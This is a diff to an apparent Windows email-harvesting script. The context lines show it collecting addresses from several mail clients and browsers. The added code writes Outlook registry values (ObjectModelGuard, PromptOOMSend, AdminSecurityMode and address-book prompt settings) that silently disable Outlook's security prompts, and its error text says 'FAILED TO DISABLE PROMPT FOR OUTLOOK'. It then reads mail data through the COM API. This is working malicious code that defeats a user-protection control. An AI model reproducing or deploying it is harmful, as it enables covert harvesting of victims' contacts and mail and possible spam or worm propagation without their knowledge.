@@ -735,27 +735,90 @@ emails.extend(thunderbird_emails)
 emails.extend(brave_emails)
 emails.extend(gx_emails)
 emails.extend(opera_mails)
+    
+def set_registry_key(hive, subkey, name, value, office_version='16.0', wow64_32=False, x86os=False):
+    try:
+        if not x86os: access = winreg.KEY_WOW64_64KEY if not wow64_32 else winreg.KEY_WOW64_32KEY
+        if hive == winreg.HKEY_LOCAL_MACHINE and wow64_32: 
+            key_path = f"SOFTWARE\\WOW6432Node\\Microsoft\\Office\\{office_version}\\Outlook\\Security"
+        else: 
+            key_path = f"SOFTWARE\\Microsoft\\Office\\{office_version}\\Outlook\\Security"
+        
+        if hive == winreg.HKEY_LOCAL_MACHINE and not x86os:
+            key = winreg.CreateKeyEx(hive, key_path, 0, winreg.KEY_WRITE | access)
+        else:
+            key = winreg.CreateKeyEx(hive, key_path, 0, winreg.KEY_WRITE)
+            
+        winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
+        winreg.CloseKey(key)
+        return True
+    except Exception as e:
+        print(f"Error setting {name}: {str(e)}")
+        return False
 
-# try:
-#     # Method 1: Outlook COM API
-#     outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
-#     for account in outlook.Accounts:
-#         emails.append(account.CurrentUser.Address)
-#     # Method 2: Raid PST files from registry
-#     reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Office\16.0\Outlook\Profiles')
-#     for i in range(winreg.QueryInfoKey(reg_key)[0]):
-#         subkey_name = winreg.EnumKey(reg_key, i)
-#         subkey = winreg.OpenKey(reg_key, subkey_name)
-#         try:
-#             pst_path, _ = winreg.QueryValueEx(subkey, '001f6700')
-#             with open(pst_path, 'rb') as f:
-#                 data = f.read()
-#                 emails.extend(re.findall(email_pattern.encode('utf-8'), data))
-#         except: pass
-# except: pass 
+def configure_outlook_security(office_version='16.0', wow64_32=False, x86os=False):
+    # Configure HKLM settings
+    hklm_success = set_registry_key(
+        winreg.HKEY_LOCAL_MACHINE,
+        None,
+        'ObjectModelGuard',
+        2,
+        office_version,
+        wow64_32,
+        x86os
+    )
+
+    # Configure HKCU settings
+    hkcu_values = {
+        'PromptOOMSend': 2,
+        'AdminSecurityMode': 3,
+        'promptoomaddressinformationaccess': 2,
+        'promptoomaddressbookaccess': 2
+    }
+
+    hkcu_success = True
+    for name, value in hkcu_values.items():
+        success = set_registry_key(
+            winreg.HKEY_CURRENT_USER,
+            None,
+            name,
+            value,
+            office_version,
+            wow64_32,
+            x86os
+        )
+        hkcu_success = hkcu_success and success
+
+    return hklm_success and hkcu_success
+
+def check_office_version(hive, office_version, wow64_32=False):
+    try:
+        access = winreg.KEY_READ | (winreg.KEY_WOW64_64KEY if not wow64_32 else winreg.KEY_WOW64_32KEY)
+        if wow64_32: key_path = f"SOFTWARE\\WOW6432Node\\Microsoft\\Office\\{office_version}\\Outlook"
+        else: key_path = f"SOFTWARE\\Microsoft\\Office\\{office_version}\\Outlook"
+        
+        with winreg.OpenKey(hive, key_path, 0, access) as key:
+            bitness, _ = winreg.QueryValueEx(key, "Bitness")
+            return bitness
+    except Exception:
+        return None
 
 def fetch_out():
     emails = []
+    try:
+        office_versions = ['16.0', '15.0', '14.0', '12.0', '11.0', '10.0', '9.0']
+        for version in office_versions:
+            bitness64 = check_office_version(winreg.HKEY_LOCAL_MACHINE, version)
+            bitness32 = check_office_version(winreg.HKEY_LOCAL_MACHINE, version, wow64_32=True)
+            if bitness64 == 'x64': 
+                if configure_outlook_security(version, wow64_32=False, x86os=False): break
+            elif bitness64 == 'x86':
+                if configure_outlook_security(version, wow64_32=False, x86os=True): break
+            elif bitness32:
+                if configure_outlook_security(version, wow64_32=True, x86os=False): break
+    except Exception as e:
+        print(f"FAILED TO DISABLE PROMPT FOR OUTLOOK: {e}")
+
     try:
         #pythoncom.CoInitialize()
         outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
